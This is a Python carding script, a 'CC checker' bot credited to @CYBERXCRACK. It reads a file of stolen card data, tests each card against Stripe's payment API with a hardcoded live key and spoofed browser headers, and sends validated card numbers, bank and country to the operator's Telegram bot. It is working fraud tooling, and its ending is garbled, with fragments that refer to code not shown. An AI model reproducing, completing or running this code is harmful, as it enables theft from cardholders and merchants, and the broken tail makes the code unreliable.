try:
	import requests
except ImportError:
	import os
	os.system('pip install requests')
idtele = input('Enter Id Tele: ')
tokentele= input('Enter Token bot: ')
filecombo = input('Enter Name File Combo: ')
def id(m):
	cc = m.split('|')[0]
	exp=m.split('|')[1]
	try:
		exy = m.split('|')[2].split('0')[1]
	except:
		exy = m.split('|')[2]
	ccv = m.split('|')[3]
	url="https://api.stripe.com/v1/payment_methods"
	h={'Host':'api.stripe.com',
'content-length':'507',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
'accept':'application/json',
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'origin':'https://js.stripe.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://js.stripe.com/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,mt;q=0.6',}
	d=f'type=card&billing_details[name]=jhin+akzos&billing_details[email]=jhonamskod@gmail.com&billing_details[address][postal_code]=10080&card[number]={cc}&card[cvc]={ccv}&card[exp_month]={exp}&card[exp_year]={exy}&guid=1ff759f4-33dc-4078-aa3b-148e45628c69e00fca&muid=ae636465-54b3-41af-9cd2-5c9938e528019e497b&sid=5d82dfe1-13a8-433f-9068-d6fb9a715e40a24519&pasted_fields=number&payment_user_agent=stripe.js%2Ff5dde66da2%3B+stripe-js-v3%2Ff5dde66da2&time_on_page=192711&key=pk_live_519E5hWDUFiwPbmz1DTdgRBoQZpjseqtjapFRLaeTRMeiep6uqY90dvqnSzczYmXJ11Y9Gu1PpvnUXGpwwaa5ygrI00fANVh1QD'
	r = requests.post(url,headers=h,data=d)
	try:
		return r.json()['id']
	except:
		return 'pm_1LrdfxHtAjaXzLU8HbHSrfEb'
def bin(bi,cc,re):
	global idtele,tokentele
	bin = bi.split('|')[0]
	url="https://lookup.binlist.net/"+bin
	r = requests.get(url).json()
	try:
		scheme = r["scheme"]
	except:
		scheme = 'None'
	try:
		type = r['type']
	except:
		type='None'
	try:
		country = r["country"]["name"]
		emoji = r["country"]['emoji']
	except:
		country='None'
		emoji='None'
	try:
		bank = r['bank']['name']
	except:
		bank = 'None'
	try:
		url = r['bank']['url']
	except:
		url = 'None'
	try:
		phone = r['bank']['phone']
	except:
		phone = 'None'
	m0=f"""
	✅ LIVE CC
━━━━━━━━━━━━━▪︎
▪︎Card: {cc}
▪︎Response: {re}
▪︎Charge: Auth$
▪︎Type: {type}
▪︎Scheme: {scheme}
▪︎Bank: {bank}
▪︎Country: {country} {emoji}
▪︎Bot by: @CYBERXCRACK 
━━━━━━━━━━━━━▪︎
	"""
	tlg=requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&text={m0}")

print(cc+'|'+sendset['error']['message']+'\n')
		except:
			pass
checker()
